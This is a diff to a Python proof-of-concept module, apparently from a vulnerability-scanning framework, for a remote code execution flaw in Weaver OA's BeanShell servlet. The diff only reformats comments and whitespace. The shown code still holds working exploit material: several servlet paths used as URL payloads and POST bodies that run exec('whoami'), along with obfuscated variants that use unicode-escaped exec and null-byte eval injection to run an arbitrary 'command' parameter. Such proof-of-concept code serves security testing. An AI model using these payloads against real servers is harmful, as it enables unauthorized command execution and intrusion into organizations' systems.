@@ -64,15 +64,16 @@ class WeaverOAREC(BasePoc):
             'Content-Length': '578'
         }
 
-        #Url_Payload1="/bsh.servlet.BshServlet"
-        #Url_Payload2="/weaver/bsh.servlet.BshServlet"
-        #Url_Payload3="/weaveroa/bsh.servlet.BshServlet"
-        #Url_Payload4="/oa/bsh.servlet.BshServlet"
+        # Url_Payload1="/bsh.servlet.BshServlet"
+        # Url_Payload2="/weaver/bsh.servlet.BshServlet"
+        # Url_Payload3="/weaveroa/bsh.servlet.BshServlet"
+        # Url_Payload4="/oa/bsh.servlet.BshServlet"
         Url_Payload5="/servlet/~ic/bsh.servlet.BshServlet"
 
         Data_Payload1="""bsh.script=exec("whoami");"""
         #Data_Payload2= """bsh.script=\u0065\u0078\u0065\u0063("whoami");"""
         #Data_Payload3= """bsh.script=eval%00("ex"%2b"ec(bsh.httpServletRequest.getParameter(\\"command\\"))");&bsh.servlet.captureOutErr=true&command=whoami"""
+
 
         url = urljoin(target,Url_Payload5)
         Data_Payload = Data_Payload1
@@ -91,7 +92,7 @@ class WeaverOAREC(BasePoc):
         else:
             if verbose:
                 highlight('[+] Weaver OA Bsh RCE not found')    # 打印高亮信息发现漏洞，其他可用方法包括info()/warn()/error()/highlight()方法分别打印不同等级的信息
-
+    
     def exploit(self, first=False):
         # 漏洞利用方法（mode=verify）
         self.verify(first=first)
